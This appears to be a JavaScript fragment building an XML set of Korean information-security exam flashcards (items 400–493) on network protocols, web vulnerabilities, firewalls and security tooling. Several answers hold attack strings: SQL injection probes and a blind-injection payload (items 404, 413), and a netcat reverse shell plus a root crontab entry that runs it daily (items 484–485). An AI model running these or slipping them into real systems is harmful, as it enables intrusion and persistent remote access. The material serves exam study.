xml+='  <problem id="400">SNMPv3에서 아래의 매개 변수는 어떠한 보안 기능을 제공하는가?&lt;br&gt;AuthoritativeEngineID AuthoritativeEngineBoots AuthoritativeEngineTime msgUsername msgAuthenticationParameters msgPrivacyParameter</problem>';
xml+='  <answer id="400">앞선 3개 : 재전송 공격 방지 &lt;br&gt;다음 2개 : 메세지 인증을 위해 HMAC 사용, &lt;br&gt;남은 1개 : 암호화를 통해 노출 공격 방지</answer>';
xml+='  <problem id="401">네트워크상의 자원들을 모니터링하고 제어하기 위한 도구는?</problem>';
xml+='  <answer id="401">NMS</answer>';
xml+='  <problem id="402">DHCP의 Full Name, Port, 관련 명령어, IP할당 절차, &lt;br&gt;관련 공격에 대해 설명하시오.</problem>';
xml+='  <answer id="402">Full Name : Dynamic Host Configuration Protocol, &lt;br&gt;&lt;br&gt;Port : 67/udp(server) &amp; 68/udp(client), &lt;br&gt;&lt;br&gt;관련 명령어 : ipconfig /release : 할당 받은 ip 주소 해제, &lt;br&gt;ipconfig /renew : 새로 할당 받음, &lt;br&gt;&lt;br&gt;IP 할당절차 : DHCP Discovery -&gt; DHCP Offer -&gt; DHCP Request -&gt; DHCP ack&lt;br&gt;&lt;br&gt;관련 공격 : DHCP Starvation &lt;br&gt;discovery를 서로 다른 mac주소로 대량 보내고 &lt;br&gt;offer에대한 Request까지만 하고 실제는 할당을 안하여 &lt;br&gt;ip를 모두 소진시키는 공격이다.)</answer>';
xml+='  <problem id="403">쿼리문의 조건절을 임의로 조작하여 인증을 우회하는 기법은?</problem>';
xml+='  <answer id="403">From SQL Injection</answer>';
xml+='  <problem id="404">Injection에 취약한지 확인하는 방법은?</problem>';
xml+='  <answer id="404">\' or "를 입력했을 때 에러 메시지가 발생한다면,&lt;br&gt;\' or 1=1# 등 무조건 참으로 만드는 입력값을 삽입한다.</answer>';
xml+='  <problem id="405">Mysql, MS SQL, Oracle의 주석처리 방법은?</problem>';
xml+='  <answer id="405">Mysql : #&lt;br&gt;MS SQL and Oracle : --</answer>';
xml+='  <problem id="406">Form SQL Injection의 대응책은?</problem>';
xml+='  <answer id="406">입력값에 대한 검증을 한다. &lt;br&gt;php.ini 설정 파일에서 magic_quetes_gpc = On 으로 설정한다. 이는 특수문자를 일반 문자로 치환해 준다. &lt;br&gt;php 5.4 버전이상에서는 더 이상 magic_quetes_gpc 설정을 &lt;br&gt;지원하지 않으므로 mysql_real_escape_string() 같은 &lt;br&gt;mysql 라이브러리 함수를 이용한다. &lt;br&gt;또는 외부로부터의 입력값을 제외한 쿼리 부분을 &lt;br&gt;미리 컴파일하는 prepared statement를 사용한다. &lt;br&gt;prepared statement는 만약 id 파라미터에 \' or 1=1# 를 &lt;br&gt;입력한다면 이것 자체를 아이디 값으로 인식한다. &lt;br&gt;문자열 black list 방법도 있다.</answer>';
xml+='  <problem id="407">한 쿼리의 결과를 다른 쿼리의 결과에 결합하여 공격하는 기법은?</problem>';
xml+='  <answer id="407">Union SQL Injection</answer>';
xml+='  <problem id="408">공격자가 파라미터와 함께 세미콜론(;)문자를 통해 명령어를 &lt;br&gt;연속적으로 수행시키면서 EXEC로 시작하는 하나의 함수처럼 &lt;br&gt;실행하는 SQL 공격은?</problem>';
xml+='  <answer id="408">Stored procedure SQL Injection</answer>';
xml+='  <problem id="409">한 번의 공격으로 대량의 DB값이 변조되어 홈페이지에 &lt;br&gt;치명적인 영향을 미치는 공격은?</problem>';
xml+='  <answer id="409">Mass SQL Injection</answer>';
xml+='  <problem id="410">DB 쿼리에 대한 에러가 외부로 노출되는 취약점을 이용한 공격은?</problem>';
xml+='  <answer id="410">Error-Based SQL Injection</answer>';
xml+='  <problem id="411">오류 메시지가 아닌 쿼리 결과의 참과 거짓을 통해 &lt;br&gt;의도하지 않은 SQL문을 실행함으로써 데이터베이스를 &lt;br&gt;비정상적으로 공격하는 기법은?</problem>';
xml+='  <answer id="411">Blind SQL Injection</answer>';
xml+='  <problem id="412">DB에 대한 메타데이터를 제공하는 스키마는?</problem>';
xml+='  <answer id="412">information_schema</answer>';
xml+='  <problem id="413">DB에서 테이블 이름이 download인 테이블의 컬럼을 알기위해서 &lt;br&gt;blind sql injection 구문은?</problem>';
xml+='  <answer id="413">%\' and substr((select column_name from information_schema.columns where table_name =\'download\' limit 0,1)1,1)=\'a\'#%</answer>';
xml+='  <problem id="414">입력값에 대한 필터링이 제대로 이루어지지 않을 경우 &lt;br&gt;공격자가 입력이 가능한 폼에 악의적인 스크립트를 삽입, &lt;br&gt;해당 스크립트가 희생자 측에서 동작하도록 하여 악의적인 &lt;br&gt;행동을 수행하는 취약점은?</problem>';
xml+='  <answer id="414">크로스 사이트 스크립트 (XSS: Cross Site Script)</answer>';
xml+='  <problem id="415">XSS 취약점 유형 3가지를 적으시오.</problem>';
xml+='  <answer id="415">Stored XSS, Reflected XSS, DOM based XSS</answer>';
xml+='  <problem id="416">stored XSS의 동작 방식에 대해 설명하시오.</problem>';
xml+='  <answer id="416">공격자가 보안이 취약한 웹서버에 악성 스크립트를 저장해 놓으면 &lt;br&gt;희생자가 해당 자료를 요청할 때 해당 악성스크립트가 삽입된 &lt;br&gt;응답 페이지가 전달되어 클라이언트 측에서 동작하는 방식이다.</answer>';
xml+='  <problem id="417">stored xss 대응법 중 html 문법상 특별한 의미를 가지는 &lt;br&gt;특수문자의 기능을 제거하고 일반 문자로 처리해주는 함수는?</problem>';
xml+='  <answer id="417">htmlspecialchars()</answer>';
xml+='  <problem id="418">html 특수 문자 &lt;, &gt; , " , \' 는 html entity로 어떻게 표현하는가?</problem>';
xml+='  <answer id="418">&amp;lt, &amp;gt, &amp;amp, &amp;quot, &amp;#039</answer>';
xml+='  <problem id="419">외부에 있는 악성 스크립트가 희생자 액션에 의해 &lt;br&gt;취약한 웹서버로 전달되고, 웹 서버의 응답 페이지에 &lt;br&gt;해당 악성스크립트가 삽입되어 희생자 측에서 동작하는 방식은?</problem>';
xml+='  <answer id="419">Reflected XSS</answer>';
xml+='  <problem id="420">응답 페이지 자체에는 악성 스크립트를 포함하지 않으며, &lt;br&gt;응답 페이지의 자바 스크립트가 DOM 객체를 통해 &lt;br&gt;요청 URL의 default 파라미터를 참조하면서 &lt;br&gt;악성 스크립트가 동작하게 되는 것은?</problem>';
xml+='  <answer id="420">DOM Based XSS</answer>';
xml+='  <problem id="421">사용자 입력값에 대한 검증은 반드시 ( )단에서 해야 한다.&lt;br&gt;클라이언트 단에서 검증을 수행하더라도 ( )을 이용해 쉽게 &lt;br&gt;우회 가능하다. 대표적인 툴로는 ( , ) 등이 있다.</problem>';
xml+='  <answer id="421">서버, web proxy tool, ( burp suite, paros )</answer>';
xml+='  <problem id="422">CSRF에 대해 설명하시오.</problem>';
xml+='  <answer id="422">Cross Site Request Forgery의 약어다. &lt;br&gt;웹 에플리케이션에서 정상적인 경로를 통한 요청과 &lt;br&gt;비정상적인 경로를 통한 요청을 서버가 구분한지 못할 경우 &lt;br&gt;공격자가 스크립트 구문을 이용하여 정상적인 사용자로 하여금 &lt;br&gt;조작된 요청을 전송 하도록 하여 게시판 설정 변경, &lt;br&gt;회원 정보 변경 등의 문제가 발생할 수 있는 취약점이다. &lt;br&gt;( 사용자의 권한을 공격자가 그대로 사용 )</answer>';
xml+='  <problem id="423">CSRF의 취약점 판단기준과 대응책은?</problem>';
xml+='  <answer id="423">판단기준 : 사용자 입력 폼에 &lt;script src="조작된 요청"&gt;을 통해 &lt;br&gt;실행되는지 확인한다. &lt;br&gt;&lt;br&gt;대응책 : 모든 http 요청 내에 예측할 수 없는 임의의 토큰을 &lt;br&gt;추가하여 정상적인 요청과 비정상적인 요청을 판별, &lt;br&gt;중요한 요청에 대해서는 재인증을 유도한다.</answer>';
xml+='  <problem id="424">웹 애플리케이션에서 system(), exec() 와 같은 시스템 명렁어를&lt;br&gt;실행할 수 있는 함수를 제공하며 사용자에 입력값에 대한 &lt;br&gt;필터링이 제대로 이루어지지 않을 경우 공격자가 &lt;br&gt;시스템 명령어를 호출할 수 있는 취약점은?</problem>';
xml+='  <answer id="424">Command Excution</answer>';
xml+='  <problem id="425">php에서 운영체제 명령어 실행 함수 4가지를 쓰시오.</problem>';
xml+='  <answer id="425">shell_exec(), exec(), system(), passthru()</answer>';
xml+='  <problem id="426">원격 명령 실행 취약점인 command excution의 대응책은?</problem>';
xml+='  <answer id="426">사용자 입력값에 대한 필터링을 한다. &lt;br&gt;운영 상 운영체제 명령어를 사용해야 한다면 &lt;br&gt;화이트 리스트를 설정한다.</answer>';
xml+='  <problem id="427">( )은 악의적인 목적으로 웹서버 내 임의의 명령을 &lt;br&gt;실행할 수 있는 서버 스크립트 파일이다.</problem>';
xml+='  <answer id="427">Webshell</answer>';
xml+='  <problem id="428">확장자 필터링이 제대로 이루어지지 않아 공격자가 웹쉘을 &lt;br&gt;업로드하여 해당 웹쉘을 통해 원격에서 시스템을 제어할 수 있는&lt;br&gt;취약점은?</problem>';
xml+='  <answer id="428">File upload</answer>';
xml+='  <problem id="429">file upload 취약점의 대응책은?</problem>';
xml+='  <answer id="429">화이트 리스트 정책을 활용하여 확장자에 대한 적절한 필터링을 &lt;br&gt;한다. 그리고 httpd.conf에서 실행 설정 제거를 한다.</answer>';
xml+='  <problem id="430">file download 취약점은 무엇인가?&lt;br&gt;</problem>';
xml+='  <answer id="430">파일 다운로드 시 파일의 경로 및 파일명을 파라미터로 받아 &lt;br&gt;처리하는 경우 이를 적절히 필터링하지 않으면 공격자가 이를&lt;br&gt;조작하여 허용되지 않은 파일을 다운 받을 수 있는 취약점이다.&lt;br&gt;</answer>';
xml+='  <problem id="431">여기저기 이동한다는 의미로 허가되지 않은 디렉터리나&lt;br&gt;파일의 경로를 횡단하면서 접근하는 공격은?</problem>';
xml+='  <answer id="431">디렉토리 탐색 공격 - directory traversal</answer>';
xml+='  <problem id="432">( )은 공격자가 악성 서버 스크립트를 서버에 전달하여 &lt;br&gt;해당 페이지를 통해 악성 코드가 실행되도록 하는 취약점으로, &lt;br&gt;스크립트 위치에 따라 ( ), ( )로 나뉜다.</problem>';
xml+='  <answer id="432">file inclusion, LFI(Local file inclusion), RFI(Remote file inclusion)</answer>';
xml+='  <problem id="433">탈취한 세션 id를 이용하여 다른 브라우저에서 &lt;br&gt;admin 계정 세션을 가로채는 것을 ( ) 이라고 한다.</problem>';
xml+='  <answer id="433">HTTP Session Hijacking</answer>';
xml+='  <problem id="434">http session hijacking를 대응하기 위한 php.ini 파일 설정 방법&lt;br&gt;3가지를 쓰시오.</problem>';
xml+='  <answer id="434">php.ini 파일 &lt;br&gt;session.gc_maxlifetime = 600(세션 타임 아웃 설정)&lt;br&gt;session.cookie_httponly = 1 ( 스크립트를 통한 참조 불가능 ) session.cookie_secure = 1 ( HTTPS 통신일 경우에만 해당 &lt;br&gt;쿠키를 전송 )</answer>';
xml+='  <problem id="435">다음 괄호안에 들어갈 말로 적절한 것은?&lt;br&gt;&lt;br&gt;( )이란 HTTP 요청에 포함 되어 있는 요청 파라미터 값이 &lt;br&gt;HTTP 응답 헤더에 포함되어 클라이언트에게 다시 전달될 때,&lt;br&gt;파라미터 값에 개행문자인 ( )과 ( ) 포함되어 HTTP 응답이 2개 &lt;br&gt;이상으로 분리, 2번째 응답에 악의적인 코드 삽입을 하는 것이다.&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="435">HTTP Response Splitting, CR( Carrige Return, %0D ), &lt;br&gt;LF( Line Feed, %DA )</answer>';
xml+='  <problem id="436">XML 데이터 질의문에 대한 필터링이 제대로 이루어지지 않을 경우 &lt;br&gt;인증 우회를 통해 인가되지 않은 데이터를 열람할 수 있는 &lt;br&gt;취약점은?</problem>';
xml+='  <answer id="436">Xpath/XQuery Injection</answer>';
xml+='  <problem id="437">인증과 인가의 차이는?</problem>';
xml+='  <answer id="437">인증은 신원이 올바른지 증명하는 것이고, &lt;br&gt;인가는 인증받은 사용자가 자원에 접근할 때 &lt;br&gt;허용할지 결정하는 것이다.</answer>';
xml+='  <problem id="438">실제 사람인지, 컴퓨터 프로그램인지를 구별하기 위한 것은?</problem>';
xml+='  <answer id="438">CHPTCHA(Completely Automated Public Turing test to tell Computers and Humans Apart)</answer>';
xml+='  <problem id="439">서버의 미흡한 설정으로 인해 인덱싱 기능이 &lt;br&gt;활성화가 되어있는 경우, 공격자가 강제 브라우징을 통해 서버 내의&lt;br&gt;모든 디렉토리 및 파일에 대해 인덱싱이 가능한 취약점은?</problem>';
xml+='  <answer id="439">디렉터리 리스팅/인덱싱</answer>';
xml+='  <problem id="440">관리자 페이지 노출은 brute force attack을 통해 &lt;br&gt;관리자 권한을 crack할 위험이 있다. &lt;br&gt;관리자 페이지 접근 제어 방법은?</problem>';
xml+='  <answer id="440"># httpd.conf&lt;br&gt;&lt;br&gt;&lt;Directory "/var/www/html/admin"&gt;&lt;br&gt;Order deny, Allow&lt;br&gt;Deny from all&lt;br&gt;Allow from [허용할 ip 설정]&lt;br&gt;&lt;/Directory&gt;</answer>';
xml+='  <problem id="441">검색로봇에 대한 웹사이트의 디렉터리 및 파일들에 대한 &lt;br&gt;검색 조건을 명시해놓은 국제 규약 및 설정 파일은?</problem>';
xml+='  <answer id="441">로봇배제표준, robots.txt</answer>';
xml+='  <problem id="442">다음을 설정하시오.&lt;br&gt;&lt;br&gt;1) 모든 검색로봇에 대해 웹사이트 전체에 대한 접근을 차단&lt;br&gt;2) GoodBot 검색로봇만 접근을 허용하고 나머지 검색로봇은 접근을 차단&lt;br&gt;3) 모든 검색로봇에 대해 /cgi-bin, /private 디렉터리에 대한 접근을 차단&lt;br&gt;4) 모든 검색로봇에 대해 /private/private_file.html 페이지 접근을 차단&lt;br&gt;5) 모든 검색로봇에 대해 .xls로 끝나는 모든 URL에 대해 접근을 차단&lt;br&gt;6) 모든 검색로봇에 대해 ?가 포함된 모든 URL 차단</problem>';
xml+='  <answer id="442">(1) &lt;br&gt;User-agent:*&lt;br&gt;Disallow: /&lt;br&gt;&lt;br&gt; &lt;br&gt;(2) &lt;br&gt;User-agent: GoodBot&lt;br&gt;Disallow:&lt;br&gt;User-agent: *&lt;br&gt;Disallow: /	&lt;br&gt;&lt;br&gt;(3) &lt;br&gt;User-agent: *&lt;br&gt;Disallow: /cgi-bin/&lt;br&gt;Disallow: /private/&lt;br&gt;&lt;br&gt;(4)&lt;br&gt;User-agent: *&lt;br&gt;Disallow: /private/private_file.html	&lt;br&gt;&lt;br&gt;(5)&lt;br&gt;User-agent: *&lt;br&gt;Disallow: /*.xls$	&lt;br&gt;&lt;br&gt;(6)&lt;br&gt;User-agent: *&lt;br&gt;Disallw: /*?</answer>';
xml+='  <problem id="443">웹 서비스 최소 권한 사용자로 운영하기 위한 설정 2가지 방법은?</problem>';
xml+='  <answer id="443">1)웹서버를 실행할 별도의 계정 및 그룹을 생성하고 &lt;br&gt;해당 사용자로 로그인 할 수 없도록 설정한다. &lt;br&gt;/etc/passwd에서                            apache:x:48:48:Apache:/var/www:/sbin/nologin 설정&lt;br&gt;&lt;br&gt;2) httpd.conf에서 서비스 프로세스의 실행 권한을 &lt;br&gt;해당 계정 및 그룹으로 설정한다.&lt;br&gt;User apache, Group apache 삽입.</answer>';
xml+='  <problem id="444">클라이언트의 요청에 의해 웹서버가 응답한 내용은 ( )라는 파일에 기록되고 클라이언트 요청에 의해 웹서버에 오류가 발생했을 경우 ( )에 기록 된다.</problem>';
xml+='  <answer id="444">access log, error log</answer>';
xml+='  <problem id="445">SSL/TLS 서버 인증서 생성 시 보안가이드는?</problem>';
xml+='  <answer id="445">2048BIT 이상의 키 사용, &lt;br&gt;인증서 발급 시 인증서 서명 알고리즘 SHA-2이상 설정. &lt;br&gt;주체/소유자 CN을 서브도메인까지 정확히 명시, &lt;br&gt;신뢰할 수 있는 인증기관 사용</answer>';
xml+='  <problem id="446">OpenSSL 라이브러리 보안가이드는?</problem>';
xml+='  <answer id="446">openssl version을 통해 version을 확인하고 최신 버전을 유지한다.</answer>';
xml+='  <problem id="447"> ( )이란 낮은 보안 등급의 정보 조각들을 조합하여 높은 보안 등급의 정보를 알아내는 것이다.</problem>';
xml+='  <answer id="447">aggregation</answer>';
xml+='  <problem id="448">( )이란 보안등급이 없는 일반 사용자가 보안으로 분류되지 않은 &lt;br&gt;정보를 정당하게 접근하여 기밀 정보를 유추해내는 행위</problem>';
xml+='  <answer id="448">Inference</answer>';
xml+='  <problem id="449">다음은 DB 보안에 관한 설명이다.&lt;br&gt;괄호안에 들어갈 말로 적절한 것은?&lt;br&gt;&lt;br&gt;접근 권한의 범위내에서 접근을 허용하는 기술적인 방법을 &lt;br&gt;(A)라고 하며, 통제 정보 등 간접적으로 노출된 데이터를 통해서 &lt;br&gt;민감/기밀 데이터가 유추되어 공개되는 것을 방지하는 것을 (B), &lt;br&gt;보안등급이 높은 객체에서 보안등급이 낮은 객체로의 &lt;br&gt;정보 흐름을 제어하는 것을 (C)이라고 한다.</problem>';
xml+='  <answer id="449">(A) : 접근 통제 &lt;br&gt;(B) : 추론 통제 &lt;br&gt;(C) : 흐름 제어&lt;br&gt;</answer>';
xml+='  <problem id="450">mysql 최초 설치 시 mysql이라는 DB를 생성한다. 이때, mysql &lt;br&gt;Default 설치 시 비어있는(NULL) DB 관리자 패스워드 설정 법은?</problem>';
xml+='  <answer id="450">update user set password = password(\'사용할 암호\') &lt;br&gt;where user = \'root\';</answer>';
xml+='  <problem id="451">( )명령은 사용자 정보의 insert, update, delete 등을 수행했을 때 &lt;br&gt;변경사항을 즉시 반영하기 위해 사용한다.</problem>';
xml+='  <answer id="451">flush privileges</answer>';
xml+='  <problem id="452">DB 사용자별 권한 설정 중 해커의 시스템 침입 대상이 &lt;br&gt;될 수 있는 것은?</problem>';
xml+='  <answer id="452">File_priv, Process_priv, Shutdown_priv</answer>';
xml+='  <problem id="453">클라우드 컴퓨팅이란?</problem>';
xml+='  <answer id="453">직접/공유된 정보통신기기, 소프트웨어 등 정보통신자원을 &lt;br&gt;이용자의 요구나 수요 변화에 따라 정보통신망을 통하여 &lt;br&gt;유동적으로 이용할 수 있도록 하는 정보처리체계</answer>';
xml+='  <problem id="454">(                  )는 클라우드 컴퓨팅의 핵심기술로 물리적인 IT자원을 동시에 다수의 논리적인 IT자원으로 사용할 수 있는 기술.</problem>';
xml+='  <answer id="454">가상화</answer>';
xml+='  <problem id="455">클라우드 컴퓨팅의 배치 모델 3가지는?</problem>';
xml+='  <answer id="455">퍼블릭, 프라이빗, 하이브리드</answer>';
xml+='  <problem id="456">SaaS의 한 종류로 보안을 클라우드 형태로 제공하는 모델은?&lt;br&gt;</problem>';
xml+='  <answer id="456">SecaaS(Security as a Service)</answer>';
xml+='  <problem id="457">비정상적인 패킷들을 취약점 스캔에 이용하는 이유는?</problem>';
xml+='  <answer id="457">IDS/IPS/FW 우회 목적 및 시스템 장애/오류를 유도한다.</answer>';
xml+='  <problem id="458">사설 IP 대역은?</problem>';
xml+='  <answer id="458">A클래스 : 10.0.0.0~10.255.255.255&lt;br&gt;B클래스 : 172.16.0.0~172.31.255.255&lt;br&gt;C클래스 : 192.168.0.0~192.168.255.255&lt;br&gt;</answer>';
xml+='  <problem id="459">Land Attack을 감지하기 위한 snort 옵션은?</problem>';
xml+='  <answer id="459">sameip</answer>';
xml+='  <problem id="460">공격자들이 SYN_FIN 플래그 조합 비정상 TCP 패킷을 &lt;br&gt;이용하는 이유는?</problem>';
xml+='  <answer id="460">구형 IDS/IPS/FW가 제대로 탐지 못하는 경우가 있고 &lt;br&gt;일부 시스템에서는 이러한 플래그 패킷에 대해 로그를 &lt;br&gt;남기지 않는 특성이 있기 때문이다. </answer>';
xml+='  <problem id="461">Snort룰에서 &lt;br&gt;flags : SF &lt;br&gt;flags:  SF+&lt;br&gt;위 둘의 차이는?</problem>';
xml+='  <answer id="461">전자는 SYN, FIN 만 설정된 경우 &lt;br&gt;후자는 SYN,FIN은 반드시 포함하고 다른 플래그도 설정될 수 있다.&lt;br&gt;</answer>';
xml+='  <problem id="462">(            ) 기능은 방화벽을 통과하는 모든 패킷에 대한 연결 상태를 &lt;br&gt;추적하여 이 정보를 메모리에 기억하고 있다가 기존의 연결을 &lt;br&gt;가장하여 접근할 경우 메모리에 저장된 상태 목록과 비교하여 &lt;br&gt;적합하면 통과하고 그렇지 않으면 거부하는 기능이다.</problem>';
xml+='  <answer id="462">상태추적 ( Connection Tracking or stateful Inspection )</answer>';
xml+='  <problem id="463">방화벽에서 패킷을 보았을 때 SYN 패킷이 보이면 (    A     )상태가&lt;br&gt;되고, SYN+ACK 패킷이 보이면 그때부터 (     B      )상태가 된다.</problem>';
xml+='  <answer id="463">(A) : NEW&lt;br&gt;(B) : ESTABLISHED</answer>';
xml+='  <problem id="464">TCP 패킷 중 상태추적 테이블에는 NEW 이면서 &lt;br&gt;SYN 플래그를 설정하지 않은 패킷을 &lt;br&gt;iptables 방화벽을 통해 차단하는 구문을 작성하시오.</problem>';
xml+='  <answer id="464">iptables -A INPUT -p tcp ! --syn -m state --state NEW -j DROP</answer>';
xml+='  <problem id="465">TCP 80 포트 요청에 대하여 동일한 24 비트 마스크 대역의 &lt;br&gt;IP에 대해서 동시 연결 개수가 10개 초과 시 iptables를 이용하여&lt;br&gt;차단하시오.&lt;br&gt;</problem>';
xml+='  <answer id="465">iptables -A INPUT -p tcp --syn --dport 80 -m connlimit &lt;br&gt;--connlimit-above 10 --connlimit-mask 24 -j DROP</answer>';
xml+='  <problem id="466">비정상적인 TCP 플래그 조합(SYN_FIN 플래그 조합)을&lt;br&gt;iptables를 이용해 차단하시오.</problem>';
xml+='  <answer id="466">iptables -A INPUT -p tcp --tcp-flags ALL SYN,FIN -j DROP</answer>';
xml+='  <problem id="467">웹 어플리케이션 보안에 특화된 보안장비는?</problem>';
xml+='  <answer id="467">WAF(Web Application Firewall)</answer>';
xml+='  <problem id="468">인가되지 않은 무선 단말기의 접속을 자동으로 탐지 및 &lt;br&gt;차단하고 보안에 취약한 무선 공유기를 탐지하는 솔루션은?</problem>';
xml+='  <answer id="468">WIPS(Wireless Intrusion Prevention System)</answer>';
xml+='  <problem id="469">다양한 보안 기능을 하나의 장비로 통합하여 제공하는 &lt;br&gt;보안 솔루션은?</problem>';
xml+='  <answer id="469">UTM</answer>';
xml+='  <problem id="470">보안 기능이 통합된 보안 커널을 추가로 인식한 운영체제는?</problem>';
xml+='  <answer id="470">Secure OS</answer>';
xml+='  <problem id="471">조직 내부의 중요 자료가 외부로 빠져나가는 것을 탐지하고 &lt;br&gt;차단하는 보안기술은?</problem>';
xml+='  <answer id="471">DLP(Data Loss Prevention)</answer>';
xml+='  <problem id="472">보안장비의 로그와 이벤트 정보를 통합해서 관리하기 위한 &lt;br&gt;목적으로 만들어진 시스템은?</problem>';
xml+='  <answer id="472">ESM( Enterprise Security Management )</answer>';
xml+='  <problem id="473">(                      )이란 동종 또는 이기종의 여러 보안 솔루션/장비에서&lt;br&gt;발생하는 로그,보안 이벤트 패턴 간에 연관성을 분석하는 것으로 &lt;br&gt;보안 위협을 보다 정확한 판단과 대응을 가능하게 하는 것이다.</problem>';
xml+='  <answer id="473">상호 연관 분석</answer>';
xml+='  <problem id="474">다음은 ESM 구성요소에 대한 설명이다.&lt;br&gt;괄호안에 들어갈 용어로 알맞은 것을 서술하시오.&lt;br&gt;&lt;br&gt;(A)란 관리 대상 보안장비에 설치되어 사전에 정의된 규칙에 따른&lt;br&gt;로그 및 이벤트 데이터를 수집하여 (B) 로 전달하는 &lt;br&gt;기능을 수행한다.&lt;br&gt;&lt;br&gt;(B)는 (A) 을/를 통해 수집된 데이터를 저장 분석하여 &lt;br&gt;그 결과를 (C)로 전달하는 기능을 수행한다.</problem>';
xml+='  <answer id="474">(A) : Agent&lt;br&gt;(B) : Manager&lt;br&gt;(C) : console</answer>';
xml+='  <problem id="475">전사적 IT 인프라의 위협을 조기에 감지하고 발생한 위협을 &lt;br&gt;감소 또는 제거하는 것을 목표로 만든 보안 시스템은?</problem>';
xml+='  <answer id="475">TMS( Threat Management System )</answer>';
xml+='  <problem id="476">(        )는 기업 네트워크에 접속하는 사용자 PC의 운영체제와 &lt;br&gt;각종 어플리케이션에 대한 패치를 기업 보안 정책에 따라 &lt;br&gt;자동으로 설치, 업그레이드함으로써 웜이나 바이러스 공격 등으로&lt;br&gt;부터 기업의 IT 환경을 효과적으로 보호해 주는 솔루션이다.</problem>';
xml+='  <answer id="476">PMS(Patch Management System)</answer>';
xml+='  <problem id="477">보안 솔루션(장비)의 취약점 보완을 위한&lt;br&gt;계정관리 및 접근 관리 방법은 무엇이 있는가?</problem>';
xml+='  <answer id="477">계정관리 : Default id, pw 변경, 계정별 권한 설정, 계정 관리&lt;br&gt;접근관리 : 원격 관리 접근 통제, 보안 접속, 세션 타임 아웃 설정</answer>';
xml+='  <problem id="478">시스템 각 개인은 유일하게 식별되어야 한다는 정보 보호 원칙은?</problem>';
xml+='  <answer id="478">책임 추적성</answer>';
xml+='  <problem id="479">시스템, 네트워크, 웹 어플리케이션 등의 알려진 취약점에 대한 &lt;br&gt;점검을 수행하는 도구와 개발한 곳은?</problem>';
xml+='  <answer id="479">네서스(nessus), 테너블</answer>';
xml+='  <problem id="480">(       A        )이란 파일시스템의 상태 추적 및 변경 여부를 &lt;br&gt;주기적으로 점검하여 의심스러운 변화가 감지되면 이를 검사하고&lt;br&gt;복구하는 과정을 말한다. &lt;br&gt;이러한 점검을 하는 대표적인 도구로 ( B )가 있다.</problem>';
xml+='  <answer id="480">(A) : 파일시스템 무결성 점검 &lt;br&gt;(B) : tripwire</answer>';
xml+='  <problem id="481">(              )은 지속적으로 자신의 존재가 탐지되지 않도록 숨기면서&lt;br&gt;관리자 권한의 획득과 백도어 등의 기능을 수행하는 코드와 &lt;br&gt;프로그램의 집합을 말한다.</problem>';
xml+='  <answer id="481">Rootkit</answer>';
xml+='  <problem id="482">루트킷 탐지 프로그램의 탐지 원리는?</problem>';
xml+='  <answer id="482">ps 실행 결과와 /Proc 디렉터리에 있는 프로세스 정보를 비교하여&lt;br&gt;/proc 디렉터리에는 프로세스가 있지만 &lt;br&gt;ps 실행 시 보이지 않는 프로세스를 히든 프로세스로 탐지한다.&lt;br&gt;</answer>';
xml+='  <problem id="483">(             ) : 클라이언트/공격자가 타켓 서버에 접속하여 &lt;br&gt;타겟서버의 쉘을 획득하는 방식&lt;br&gt;&lt;br&gt;(           ) : 역으로 타켓 서버가 클라이언트/공격자로 접속해서 &lt;br&gt;클라이언트가 타켓 서버의 쉘을 획득하는 방식</problem>';
xml+='  <answer id="483">바인드쉘, 리버스쉘</answer>';
xml+='  <problem id="484">NC(netcat)를 이용해 리버스 쉘을 할 때 공격자와 타겟은 &lt;br&gt;각각 어떤 명령어를 수행하는가? &lt;br&gt;※ 공격자 IP(10.10.10.10), 포트 80, 파일이름(/bin/bash)&lt;br&gt;</problem>';
xml+='  <answer id="484">공격자 : nc -lvp 80 &lt;br&gt;타겟 : nc 10.10.10.10 80 -e /bin/bash &lt;br&gt;(10.10.10.10이 공격자 ip라고 가정)</answer>';
xml+='  <problem id="485">다음 crontab 스케줄을 해석하시오.&lt;br&gt;&lt;br&gt; 30 2 *  * * root /usr/bin/nc 10.10.10.10 80 -e /bin/bash</problem>';
xml+='  <answer id="485">매일 오전 2시 30분 &lt;br&gt;nc 10.10.10.10 80 -e /bin/bash를 root권한으로 실행한다.&lt;br&gt;</answer>';
xml+='  <problem id="486">다음 빈칸 A,B에 들어갈 말을 쓰시오.&lt;br&gt;&lt;br&gt;소프트웨어나 하드웨어의 버그 또는 취약점을 이용하여 공격자가 의도한 동작이나 명령을 실행하도록 하는 코드 또는 그러한 행위를&lt;br&gt;( A )라 하며 위 행위에 성공하면 프로그램 실행 제어권을 &lt;br&gt;획득하게 되고 공격자가 의도한 명령을 담고 있는 &lt;br&gt;코드를 실행하는 데 이를 (     B     )라고 한다.</problem>';
xml+='  <answer id="486">(A) : Exploit&lt;br&gt;(B) : Shell code</answer>';
xml+='  <problem id="487"> (                )는 아무 기능도 수행하지 않는 명령어를 의미한다. &lt;br&gt;기계어 코드의 헥사 값은 (               )이다.&lt;br&gt;</problem>';
xml+='  <answer id="487">NOP, 0x90 </answer>';
xml+='  <problem id="488">공개적으로 알려진 소프트웨어의 보안취약점을 표준화한 식별자 &lt;br&gt;목록으로 미국 비영리 회사인 (            )에서 시작하여 &lt;br&gt;국가 취약성 DB를 만들어 협력체계를 구축한 것은?</problem>';
xml+='  <answer id="488">MITRE, CVE</answer>';
xml+='  <problem id="489">소프트웨어에서 공통적으로 발생하는 약점을 &lt;br&gt;체계적으로 분류한 목록은?</problem>';
xml+='  <answer id="489">CWE(Common Weakness Enumeration)</answer>';
xml+='  <problem id="490">소프트웨어 개발자가 범할 수 있는 보안상 가장 위험한 &lt;br&gt;25가지 소프트웨어 취약점 목록을 무엇이라 하는가?&lt;br&gt;</problem>';
xml+='  <answer id="490">CWE/SANS TOP 25</answer>';
xml+='  <problem id="491">취약한 PC 환경의 사용자가 홈페이지에 접속할 경우 &lt;br&gt;자신의 의도와는 무관하게 악성코드가 다운로드 되어 &lt;br&gt;설치되는 공격은?</problem>';
xml+='  <answer id="491">DBD(Drive-By-Download)</answer>';
xml+='  <problem id="492">난독화를 하는 이유 2가지를 서술하시오.</problem>';
xml+='  <answer id="492">1. 가독성을 낮춰 분석을 어렵게 하기 위함.&lt;br&gt;2. 탐지 우회</answer>';
xml+='  <problem id="493">웹사이트 화면을 해커가 원하는 화면으로 바꾸고 &lt;br&gt;해킹 성공을 알리는 공격으로 시각적으로 자신의 존재감을 알리고&lt;br&gt;정치적인 메시지나 자신의 실력을 과시하는 것을 무엇이라 하는가?</problem>';
